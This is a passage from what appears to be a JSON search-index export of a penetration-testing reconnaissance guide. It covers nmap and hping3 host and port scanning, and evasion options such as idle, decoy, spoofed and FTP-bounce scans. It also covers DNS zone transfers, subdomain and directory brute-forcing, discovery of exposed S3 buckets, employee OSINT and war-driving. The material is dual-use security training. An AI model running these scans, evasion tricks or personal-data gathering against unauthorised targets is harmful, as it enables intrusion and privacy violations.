    "c": "Host discovery with TCP  Split port scans by port number Low TCP port scans Medium TCP port scans High TCP port scans Split scans  Split the scans to get a set of results back in a shorter period of time. This makes it possible to start testing while the remaining results come back. By the time medium port scans are finished, underlying services of the lower ports have probably been enumerated. Use ports 0-1024 for the low range (System Ports). These scans cover services such as SMTP, Windows File Sharing, HTTP, HTTPS and other commonly found services. For medium port use ports 1025-32767 (the bulk of the User Ports). These cover NFS, Sun RPC Port Mapper, X-Windows, VNC, Microsoft Terminal Services, etc. The high port scans are for ports in the range 32768-65535 (the lesser used User Ports and Dynamic or Ephemeral ports). Hints  Do not ping the target in these scans because there may be filtering in place, which could result in pings failing and nmap accidentally concluding that a host is down. Under the hood  TCP SYN (Stealth) scan ( -sS ) is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy, since it never completes TCP connections. It works against any compliant TCP stack, and allows clear, reliable differentiation between open, closed, and filtered states. Nmap starts by sending a TCP packet with the SYN flag set and the target send back a response with the SYN and ACK flags. NMap does not complete the handshake with the expected ACK and the OS suddenly receives a SYN/ACK while it hasn’t requested (NMap did). The OS responds to the unexpected SYN/ACK with an RST packet. All RST packets in such scenarios also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning. If a service is listening on a port and someone makes a connection to it (by sending a SYN packet), the service will send a SYN/ACK packet in return. That means that there is a machine at that IP address. Note that some operating systems will respond with a SYN/ACK to SYN s sent to ports used for outbound TCP connections, while others will not. If no service is listening on that port but the machine is up and running and on the network, a reset ( RST ) packet will be sent back. That means there is nothing listening on that port, but having sent something in return means that a machine is at that IP address. If nothing is received after sending a SYN packet, it means there is no host at that IP address OR a firewall is blocking traffic OR the host is down. Port 80 is therefore extremely useful for ping sweeps, because most firewalls and port filters do not block web traffic. Send Receive Send Assumption SYN SYN/ACK ACK followed by RST Port is open, host is up SYN RST - Port is closed, host is up SYN Nothing - Port is blocked by firewall, host is down, or there is no host at that IP address. Interpreting portscan outputs  Some puzzling with indicators will help: Anything from 40000 onwards could be anything and only be temporary NFS can run on any port, but the Linux NFS Kernel server implementation always runs on port 2049 by default. VNC clients typically are on port 5900+ If port 5900 AND 5901 are open, most likely 5901 is a second VNC service. If port 5901 is open and 5900 closed, who knows? TCP port 8080 open can indicate a proxy server, or something like Apache Tomcat, or … A Windows Active Directory controller will have TCP ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 636 (LDAP/S) and the common NetBIOS and Windows File Sharing ports 135 (used for RPC comms for AD replication), 139 (Authentication) and 445 (used for a whole host of services including file sharing and authentication) Windows systems tend to use TCP port 3389 for Microsoft Remote Desktop Protocol access. Unix-like systems often use text-based protocols on TCP ports 22 (SSH), 23 (Telnet) and 514 (RSH), or network-based Windowing protocols on TCP ports such as 590x (VNC) or 600x (X11). Examples  Low TCP port scans: # nmap -sS -PN -p 0-1024 -n -iL $TARGETFILE -oA nmap/tcp-lo The result is an open port list, with port and protocol, the port’s state and the by IANA allocated service for that port. This does not mean that a port actually runs that service. Medium TCP port scans: # nmap -sS -PN -p 1025-32767 -n -iL $TARGETFILE -oA nmap/tcp-med Remaining TCP port scans: # nmap -sS -PN -p 32768-65535 -n -iL $TARGETFILE -oA nmap/tcp-hi Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9eeb2329002066a0902a656ee46d6c70",
    "u": "https://recon.tymyrddin.dev/docs/physical/facilities",
    "t": "Recon of facilities ",
    "c": "Recon of facilities  Organisations can use a number of physical security controls to regulate who gains access to the facility or what areas in the facility they gain access to. See if you can bypass the security to gain access to areas of facilities you should not have access to. Resources  Guidelines for Performing Physical Security Tests on Facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "439632600c2c42ec4725efa6ef2a8c2e",
    "u": "https://recon.tymyrddin.dev/docs/cloud/s3-urls",
    "t": "Investigating AWS S3 URLs ",
    "c": "Investigating AWS S3 URLs  Endpoints  S3 endpoint is a region-specific URL that is used in both S3 URL styles. Most of the endpoints follow this pattern (with region names being eu-west-1 , us-west-2 , etc): s3-REGION.amazonaws.com And there are some oddities useful to know. Two endpoints that do not follow the above pattern are those of the us-east-1 region. For that region endpoints are synonyms and both point to the same place: s3.amazonaws.com s3-external-1.amazonaws.com Further, the eu-central-1 (Frankfurt) and ap-northeast-2 (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (the first dash is replaced by dot): s3-eu-central-1.amazonaws.com s3.eu-central-1.amazonaws.com s3-ap-northeast-2.amazonaws.com s3.ap-northeast-2.amazonaws.com S3 bucket URL schemes  According to the S3 Developer Guide (PDF, p.57), S3 supports both virtual-hosted and path URL styles for bucket access. Path style URL  In path style URL, the bucket name is appended to the domain name and is a part of the URL path: http://s3endpoint/<bucket-name> Virtual-hosted style URL  In virtual-hosted style URL the bucket name becomes a subdomain: http://BUCKET.s3endpoint Static Website Hosting Endpoints  Using S3’s Static Website Hosting feature requires using Website Endpoints. There are two general forms of S3 website endpoint: http://BUCKET.s3-website-region.amazonaws.com http://BUCKET.s3-website.region.amazonaws.com Most of the regions follow the first form, while eu-central-1 and ap-northeast-2 follow the second. Presigned URL  Users can create a presigned URL for an object, for which security credentials, a bucket name, an object key, an HTTP method (GET to download the object), and an expiration date and time are given. The presigned URLs are valid only for the specified duration. If a presigned URL is made using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time. Anyone who receives the presigned URL can then access the object. Because presigned URLs grant access to the Amazon S3 buckets to whoever has the URL, Amazon recommends they be protected appropriately . Something often forgotten, apparently. Getting it, but not quite.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "99f2c2f99f7d5f85c1898215c9e40a69",
    "u": "https://recon.tymyrddin.dev/docs/api/secrets",
    "t": "Check for exposed secrets ",
    "c": "Check for exposed secrets  The authentication mechanism is used to identify the user and ensure that they are authorized to access the API. The authentication mechanism is usually a username and password, but it can also be a token or a certificate. It also gives clues to potential vulnerabilities in the API. If the authentication mechanism is weak, then the API is more vulnerable to attack. Resources  API Security Top 10",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dd3825e3f3fb61448b666dffc1f7a801",
    "u": "https://recon.tymyrddin.dev/docs/app/techstack",
    "t": "Tech stack fingerprinting ",
    "c": "Tech stack fingerprinting  Fingerprinting techniques can help you understand the target application even better. Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to perform targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version. Run Nmap on a machine with the -sV flag on to enable version detection on the port scan. In Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. Many web frameworks or other technologies will embed a signature in source code. Right-click a page, select View Source Code , and press CTRL-F to search for phrases like powered by , built with , and running . Check technology-specific file extensions, filenames, folders, and directories. Wappalyzer is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. BuiltWith is a website that shows you which web technologies a site is built with. StackShare is an online platform that allows developers to share the tech they use. Maybe the organisation’s developers have posted their tech stack. And Retire.js is a tool that detects outdated JavaScript libraries and Node.js packages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a266ac0d06711e4fbb3260fc2906110",
    "u": "https://recon.tymyrddin.dev/docs/scanning/stealth",
    "t": "Stealth scans ",
    "c": "Stealth scans  Stealth  Never use connect scan ( -sT ), which establishes a full connection to a port, if one wishes to remain stealthy. Excessive port connections can create a DoS condition on older boxes, and will raise the alarms on any IDS. Use a stealthy port-scanning method with nmap, such as a TCP SYN scan (sometimes called a half-open scan). It is not only stealthy, it is also lighter on both systems, source and target. Mask your IP from the target (Don’t expect to find possibilities for either of these two all the time, but do keep looking, especially among older systems not offering useful services.): Use an FTP bounce scan if possible. Some ftp servers allow anonymous users to proxy connections to other systems. If you find an anonymous ftp server during enumeration, or you know of one to which you have login credentials, try using the -b option with user:pass@server:ftpport . If the server does not require authentication, you can skip the user:pass and if it is running on the standard port you can also leave out the ftpport part. This only works on some ftp servers. Many ftp servers today have this option disabled (by default). Idle scan gives a similar result but uses a different type of scanning. If you can identify an intermediate machine (a zombie) with low traffic and predictable fragment identification values (IP ID) you can send spoofed packets to your target, with the source set to the zombie with -sI zombiehost:port . An IDS will see the idle scan target as the system doing the scanning. If the idle target is a by your target trusted machine that can bypass host-based access control lists, jackpot!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6342ea6759dd923f27e88734c46e6acf",
    "u": "https://recon.tymyrddin.dev/docs/app/stroll",
    "t": "Manually walk through the target ",
    "c": "Manually walk through the target  Manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don’t usually use. Get a rough idea of what the attack surface (all the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6271cfa9c8df69dc86ca8854add5e18",
    "u": "https://recon.tymyrddin.dev/docs/scanning/icmp",
    "t": "Host discovery with ICMP ",
    "c": "Host discovery with ICMP  The easiest and fastest way to discover if a host is up or not is by trying to send some ICMP packets. Send an echo request using a simple ping or fping (for ranges). If pinging a single host works, try a ping-sweep: Send out ICMP echo requests to every system on a particular network or subset of a network to determine which hosts are up. ICMP error messages can be used to mask the source of a Distributed Denial of Service attack, and with such attacks being common, ICMP error rate limiting is often applied. To avoid filters to common ICMP echo request-response, use nmap to send other types of ICMP packets. If scans still take incredibly long, try discovering hosts with a SYN scan or UDP scan instead. Examples  Send a single echo request # ping -c 1 192.168.122.10 Send echo requests to ranges: # fping -g 192.168.122.0/24 Using nmap, send echo, timestamp requests and subnet mask requests: # nmap -PEPM -sP -n 192.168.122.0/24",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "669a9cd0954ec976c9347b7e46848a15",
    "u": "https://recon.tymyrddin.dev/docs/scanning/hosts",
    "t": "Live host discovery ",
    "c": "Live host discovery  Types of scans  ARP, ICMP, TCP, and UDP can detect live hosts. Any response from a host is an indication that it is online. Scan Type Example Command ARP Scan sudo nmap -PR -sn /24 ICMP Echo Scan sudo nmap -PE -sn /24 ICMP Timestamp Scan sudo nmap -PP -sn /24 ICMP Address Mask Scan sudo nmap -PM -sn /24 TCP SYN Ping Scan sudo nmap -PS22,80,443 -sn /30 TCP ACK Ping Scan sudo nmap -PA22,80,443 -sn /30 UDP Ping Scan sudo nmap -PU53,161,162 -sn /30 Options  Option Purpose -n no DNS lookup -R reverse-DNS lookup for all hosts -sn host discovery only",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c795c53795ef1db0037e6f7bdcee1f11",
    "u": "https://recon.tymyrddin.dev/docs/api/collect-data",
    "t": "Collect data ",
    "c": "Collect data  Collect data from applications through automated and manual means. Scan for open ports and services using shodan Use an application as intended Inspect web application with DevTools Search for API-related directories Discover API endpoints From here: an entry point (typically using the root URI of “/”) contains links to other REST APIs. Those APIs will contain links to other APIs and so on. Ideally, there is no API that does not have a link to it. Tools  Kiterunner Nikto OWASP ZAP",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0aa1ce3d047d15d68e4a4414feb546fc",
    "u": "https://recon.tymyrddin.dev/docs/scanning/udp",
    "t": "Host discovery with UDP ",
    "c": "Host discovery with UDP  Split port scans by port number Low UDP port scans Remaining UDP port scans Relationship with ICMP  UDP is a stateless protocol. It was designed for applications that do not care whether a packet is received. This could saturate a link, and ICMP is used in its congestion control. Because UDP is stateless, it is easy to spoof using ICMP error messages to mask the source of a Distributed Denial of Service attack, and with such attacks common, UDP scans are considered bad and ICMP error rate limiting good. With 65,535 ports to scan and error rate limits of 1 ICMP message per second, it can take 9+ hours to scan some hosts. Solutions are scanning multiple hosts in parallel, scanning popular ports first, and ignoring ports that require specific protocols and scanning those separately. Older versions of Windows (and some configurations of current Windows systems) do not implement ICMP error rate limiting. Knowing beforehand which are Windows systems, these can be put on a separate IP list. Not responding  UDP services are highly unlikely to respond to a regular empty UDP probe datagaram because the underlying application does not receive a packet that causes it to respond. The solution is to send a packet related to the most likely service (based on port number) running under it. For example, brute forcing SNMP on port 161 could be worthwhile and sending a correctly formed DNS query datagram to UDP port 53 will likely give a useful response. Interpreting portscan outputs  nmap will report a lot of closed ports, and some as open|filtered . The latter means that nmap did not receive a response. Use a combination of ICMP and IP to whittle things down: An open port will respond to a correctly formed application message if the service is supposed to respond to that message A closed port will lead to an ICMP port unreachable from the device (or a similar destination unreachable message from a nearby device) A filtered port will occasionally result in a message, but more often than not, nothing If a packet’s TTL expires an ICMP TTL Expired In Transit message is sent from the router the datagram is currently passing through to the packet’s source Examples  Low UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 0-1024 -oA nmap/udp-lo -sV Expect to find 53, 111 and 137 open. Remaining UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 1025-65535 -oA nmap/udp-full -sV Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b01e41888e428481743749b796e42f7",
    "u": "https://recon.tymyrddin.dev/docs/scanning/ports",
    "t": "Port scanning ",
    "c": "Port scanning  Types of scans  Port Scan Type Example Command TCP Connect Scan nmap -sT TCP SYN Scan sudo nmap -sS UDP Scan sudo nmap -sU TCP Null Scan sudo nmap -sN TCP FIN Scan sudo nmap -sF TCP Xmas Scan sudo nmap -sX TCP Maimon Scan sudo nmap -sM TCP ACK Scan sudo nmap -sA TCP Window Scan sudo nmap -sW Custom TCP Scan sudo nmap --scanflags URGACKPSHRSTSYNFIN Spoofed Source IP sudo nmap -S SPOOFED_IP Spoofed MAC Address --spoof-mac SPOOFED_MAC Decoy Scan nmap -D DECOY_IP,ME Idle (Zombie) Scan sudo nmap -sI ZOMBIE_IP Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Options  Option Purpose -p- all ports -p1-1023 scan ports 1 to 1023 -F 100 most common ports -r scan ports in consecutive order -T<0-5> T0 being the slowest and T5 the fastest --max-rate 50 rate <= 50 packets/sec --min-rate 15 rate >= 15 packets/sec --min-parallelism 100 at least 100 probes in parallel --source-port PORT_NUM specify source port number --data-length NUM append random data to reach given length Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports. Option Purpose --reason explains how Nmap made its conclusion -v verbose -vv very verbose -d debugging -dd more details for debugging",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "682e6c01de9ffba0dd3f030fb4db3374",
    "u": "https://recon.tymyrddin.dev/docs/app/dns",
    "t": "Scope discovery ",
    "c": "Scope discovery  Gather deeper and wider Discover websites on the same server Discover subdomains Discover email addresses Discover sensitive files WHOIS and Reverse WHOIS  Use whois to gather Domain name, IP address, Administrative Details, autonomous system number, DNS Go to www.arin.net/whois and search for target name in the ARIN Whois/RDAP Search bar. Find a handle which displays more information about this registration including the range of IP addresses. Find an entry with a net range (public IPs). Determine all the public IP blocks the target may have. If you cannot find any results try some other Whois database search sites. IP addresses  nslookup www.target.com Setting the type of query to MX (mail exchange) records: nslookup set type=MX target.com Then use nslookup again to resolve the FQDNs of the mail servers to IP adressess. Try a DNS zone transfer: nslookup server <ip_or_fqdn_of_target_DNS_server> set type=all ls -d <target_domainname> If successful, make a note of it and add it to the remediation list in the pentest report. Researching certificates  Another way of finding hosts is to take advantage of the Secure Sockets Layer(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh , Censys , and Cert Spotter to find certificates for a domain. 👉 Wildcard certificates are a single point of failure. If we stumble upon the private key while roaming the network, we could intercept the communication flow of all applications using that same parent domain. When a certificate authority issues a certificate, these are entered into a central repository called a certificate log. This repository keeps a binary tree of all certificates, where each node is the hash of its child nodes, thereby guaranteeing the integrity of the entire chain. All issued TLS certificates should be publicly published to detect domain spoofing, typo-squatting, homograph attacks, and other mischievous ways to deceive and redirect users. These logs can be searched. Secret applications with little security hiding behind proxies can be exposed, and minimally subdomain enumeration is way faster. Subdomain enumeration  After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents a new angle for attacking the network. The best way to enumerate subdomains is to use automation. Tools like Sublist3r , SubBrute , Amass , and Gobuster can enumerate subdomains automatically with a variety of wordlists and strategies. For example, Sublist3r works by querying search engines and online subdomain databases, while SubBrute is a brute-forcing tool that guesses possible subdomains until it finds real ones. Amass uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains. You can build a tool that combines the results of multiple tools to achieve the best results. Service Enumeration  Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning. In active scanning, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look for open ones. You can use tools like nmap or masscan for active scanning. In passive scanning, third-party resources are in use to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use Shodan , Censys and Project Sonar . Combine the information gathered from different databases for the best results. Enumerate webserver directories  The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server. Even if you can’t find any immediate exploits, directory information often tells you about the structure and technology of an application. The nmap NSE script http-enum.nse offers a quite extensive fingerprint, especially when including Nikto database, but there are no guarantees all will be seen. And Nikto is very noisy. You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what An example of running a Dirsearch command. The -u flag specifies the hostname, and the -e flag specifies the file extension to use when constructing URLs: ./dirsearch.py -u target_url -e php Gobuster’s dir mode can be used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this mode, you can use the -u flag to specify the domain or subdomain you want to brute-force and -w to specify the wordlist you want to use: gobuster dir -u target_url -w wordlist Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like EyeWitness or Snapper to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained. These are all common places for vulnerabilities to manifest. Spidering the site  Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application. OWASP Zed Attack Proxy (ZAP) has a built-in web spider, and Burp Suite has an equivalent tool called the crawler. Third-party hosting  Take a look at the company’s third-party hosting footprint. For example, look for the organisation’s S3 buckets. A way to find those is through Google dorking. site:s3.amazonaws.com COMPANY_NAME site:amazonaws.com COMPANY_NAME If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs: amazonaws s3 COMPANY_NAME amazonaws bucket COMPANY_NAME amazonaws COMPANY_NAME s3 COMPANY_NAME Another way of finding buckets is to search a company’s public GitHub repositories for S3 URLs. Try searching these repositories for the term s3 . GrayhatWarfare is another online search engine you can use to find publicly exposed S3 buckets. And you can try to brute-force buckets by using keywords. Lazys3 is a useful tool for that. It relies on a wordlist to guess buckets that are permutations of common bucket names. Bucket Stream parses certificates belonging to an organisation and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible. Once you’ve found a couple of buckets that belong to the target organisation, use the AWS command line tool to see if you can access one. Install the tool with: pip...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "96231753af2d5325a33d6b571575598f",
    "u": "https://recon.tymyrddin.dev/docs/physical/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gather information to create an operations plan. In some cases, the client will provide much of the information, like vendors used, photographs of the locations, floorplans, front desk procedures, dress codes, photos of badges, security systems in place. If not, do recon. Why?  Identify vulnerabilities and weaknesses in physical security controls. How?  Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a05f62e88cc94afbe9f6b33a26b11d7",
    "u": "https://recon.tymyrddin.dev/docs/api/burp",
    "t": "Analyse traffic ",
    "c": "Analyse traffic  Pass web service application traffic through a proxy to gather more detail. Using a proxy helps dig into a website and look for vulnerabilities. FoxyProxy is a Firefox extension for switching an internet connection between proxy servers based on URL patterns. It simplifies configuring browsers to access proxy servers. Burp Suite is a popular penetration testing and vulnerability finder tool for checking web application security. To discover hidden flaws, route traffic through a proxy like Burp Suite. FoxyProxy can be used to turn it on and off.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f4610429197f0979ce6050fa01a81bc3",
    "u": "https://recon.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Locate the APIs and validate whether they are operational, find credential information (keys, secrets, usernames, passwords), version information, API documentation, and information about the API’s purpose. Why?  The more information gathered about a target, the better the odds of discovering and exploiting API-related vulnerabilities. How?  Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ba3d3d5b3212810790cf7755baf5a35",
    "u": "https://recon.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Recon strategies for gathering intel on a target. Why?  To discover all the possible ways of attacking a target before deciding on the most effective approach for web application hacking. How?  Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b4558c53e32c537879a01783be1762d",
    "u": "https://recon.tymyrddin.dev/docs/scanning/diving",
    "t": "Diving deeper in discovery ",
    "c": "Diving deeper in discovery  Identify live networks between source and already identified subnets Traceroute to the gateway or DNS server for each network Add newly identified networks to the list of subnets Discover the IP addresses of servers behind a DNS Discover how long a server has been up Where is a server’s physical location … Under the hood  Traceroutes work by manipulating the Time-To-Live (TTL) field in an IP packet. This field tells a device a packet is passing through how many more systems (or hops) a packet can pass through before being dropped. This is to ensure that lost packets do not just simply hop around the Internet forever and eventually, with enough lost packets clogs it up. The field is decremented as it passes through each network hop. When it reaches zero, a router will drop the packet being sent through it and send an ICMP Time-To-Live exceeded message back to the source. This can be used to determine the route to a host or network, the time it takes for a message to be sent and a response to be received by using a traceroute, which service provider the target is using There is an ICMP traceroute (tracert.exe, Windows) and a UDP traceroute (traceroute -l, all other OSs). ICMP traceroute expects all intermediary routers to respond with an ICMP TTL Exceeded message. Most do not (RFC 792) UDP traceroute is not so great where filtering is in place. Most Unix traceroute implementations now support TCP static port traceroutes out of the box. Mapping out DMZ and internal networks  Because all traceroutes work using ICMP TTL Exceeded messages, which protocol is used is not important as long as there is a known response. Use a TCP traceroute with a SYN flag set, and commonly open ports such as 25, 80 or 443 for which you can get a reliable response back once the target is reached. Uptime  Each time a server is patched or updated, it must also be rebooted. If a server has been up for a long time, we know it has not been patched or updated in that time, and that it will be vulnerable to all vulnerabilities discovered during that timeframe. Examples  Traceroute in nmap with Geo resolving: nmap --traceroute --script traceroute-geolocation.nse -p 80 [ip_or_hostname] The default packet which hping3 will create is a TCP packet: # hping3 -T -V --tr-stop -S -p 80 [ip_or_hostname] Specify the source and destination ports of the packet to help it bypass the firewall. Send three packets out ( -c ) to destination port 53 ( -p ) and set the SYN flag in the packet, so it looks like the first phase of the three-way handshake ( -S ): hping3 -c 3 -p 53 -S [ip_or_hostname] Traceroute in hping3 using a TCP scan to a specific destination port: # hping3 --traceroute --verbose --syn --destport [80] [ip_or_hostname] Discover the IP addresses of servers behind a DNS: # hping3 [big site hostname] -S -p 80 -T –ttl 13 –tr-keep-ttl -n Uptime of a server: # hping3 [ip_or_hostname] -p 80 –tcp-timestamp -S -c 4",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "77bef2e609a2bbb9d38d4b3ba1cf60fb",
    "u": "https://recon.tymyrddin.dev/docs/app/sneaky",
    "t": "Other sneaky OSINT techniques ",
    "c": "Other sneaky OSINT techniques  Engineering job listings often reveal the technologies the company uses. If you can’t find relevant job posts, search for employees’ profiles on LinkedIn, and read employees’ personal blogs or their engineering questions on forums like Stack Overflow and Quora. People’s work calendars often contain meeting notes, slides, and sometimes even login credentials. If an employee shares their calendars with the public by accident, you could gain access to these. The organisation or its employees’ social media pages might also leak valuable information. Like a sets of valid credentials on Post-it Notes visible in the background of office selfies??? If the company has an engineering mailing list, sign up for it to gain insight into the company’s technology and development process. Check for SlideShare or Pastebin accounts. Consult archive websites like the Wayback Machine . Tomnomnom’s tool Waybackurls can automatically extract endpoints and URLs from the Wayback Machine.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "563d3df639de5cc87ce98241d343a8a5",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gathering information about a target system that can be used to execute a successful attack. To get this information, use various methods with variant tools. Why?  Analyse the security posture of the target and find loopholes for creating an attack plan. Using different tools and techniques, narrow down the range of IP addresses. Use the collected information to identify weaknesses in the target’s security. Graphically represent the target’s network, so it can be used as a guide during the attack. How?  Gather network information Gather system information Collect organisation information",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "07424d82724b1a48d202f4f49f538fd1",
    "u": "https://recon.tymyrddin.dev/docs/api/functionality",
    "t": "Understand application functionality ",
    "c": "Understand application functionality  Enumerate the endpoints and identify the parameters that can be used to call the API. Use a tool like Postman to send requests to the API and see the response. Review the API documentation. This will help understand the functionality of the API and identify the attack surface. Resources  Using SOAP requests",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17d2dcae1d0a060e2a5976096aaad82d",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/organisation",
    "t": "Collect organisation information ",
    "c": "Collect organisation information  Employee information Organisation’s background Phone numbers Locations Advanced searches  Search engines can be used to gather information about the target organisation. Search results can include , and other information that could be useful. Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information: Information about employees Intranet information Login pages Documents for internal company use Confidential spreadsheets with usernames, email addresses, and even passwords Files containing usernames Sensitive directories Service version number (some of which might be vulnerable and unpatched) Error messages Google dorking  Google dorking is a technique which involves using a set of search operators and building complex queries. The operators that are used in Google hacking are called dorks. Email footprinting  Email footprinting involves collecting information from emails by monitoring the email delivery and inspecting the headers: IP address of the recipient Geolocation of the recipient Delivery information Visited links Browser and OS information Reading time Email headers contain information about the sender, subject, and recipient. All this information is valuable to hackers when planning to attack their target. Information contained in email headers include: Sender’s name IP/Email address of the sender Mail server Mail server authentication system Send and delivery stamp Unique number of the message Email tracking tools have the capability of tracking emails and inspecting their headers to extract useful information. The sender is notified of the email being delivered and opened by the recipient. Assets discovery  Assets discovery involves collecting all the company names owned by a main company and then all the assets of these companies: Find the acquisitions of the main company, this will give the companies inside the scope. Find the ASN (if any) of each company, this will give the IP ranges owned by each company. Use reverse whois lookups to search for other entries (organisation names, domains…) related to the first one (recursively). Shodan and SSL filters can be used to search for other assets (the SSL trick can be done recursively). Investigating social media  The private world of yesterday is now an online world. Everyone with a search engine has open access to social networks, government databases, and public records. Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name but a few, it’s worthwhile checking the following: LinkedIn Twitter Facebook Instagram Google groups Social media scraping can automate discovering names, email addresses, phone numbers, biographies. Visit job listing sites  Job advertisements can also tell a lot about an organisation. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where the target would post their ads. And it is always worth checking their website for any job opening and seeing if this can leak any interesting information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106e87e4f24df095e7d4f2ad32baaf0a",
    "u": "https://recon.tymyrddin.dev/docs/scanning/defence",
    "t": "Defence detection ",
    "c": "Defence detection  Check to see if a target is using a load balancing solution with the lbd (load balancing detector) command. To determine if the target is behind a web application firewall (WAF), use the wafw00f command. It may be needed to encode some attack tools to try to trick antivirus software into not seeing the code as being harmful. To detect what ports a firewall is forwarding on to a target, use the firewalk command. Is also available for nmap as firewalk.nse script.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aba9d1f5df203926b310557f55850f83",
    "u": "https://recon.tymyrddin.dev/docs/scanning/war-dialing-driving-flying-shipping",
    "t": "War-dialing-driving-flying-shipping ",
    "c": "War-dialing-driving-flying-shipping  Discover wireless networks. War dialing  Large organisations usually have their phone numbers assigned in blocks from a local telephone company, and many have their own dialing prefix. This information was used in war dialing all the company phone numbers looking for a dial-up server. Once such a server was found, it was used for guessing account usernames. War driving  War-driving, sitting in a parking lot or in a building across the street with a laptop and a wireless NIC, looking for unsecured or poorly secured access points. War-driving has been made easy by programs such as Network Stumbler and Wellenreiter, which use consumer WiFi cards to automatically scan the airwaves for networks. These wardriving programs and databases are often correlated with global positioning system (GPS) data so that physical maps of these networks can be made. War strolling  War-strolling, simply walking around with wireless equipment looking for networks. War flying  War-flying, mounting antennas on a drone and flying it around as a variation on war-driving. War shipping  War-shipping, shipping someone a device that does wireless scans. It uses disposable, low-cost and low-power 3G-enabled single-board computers that are easy to build for under 100 euro, the proliferation of e-commerce deliveries and a command-and-control (C&C) server to remotely perform close-proximity attacks, regardless of the location of an adversary. It increases target accuracy dramatically. 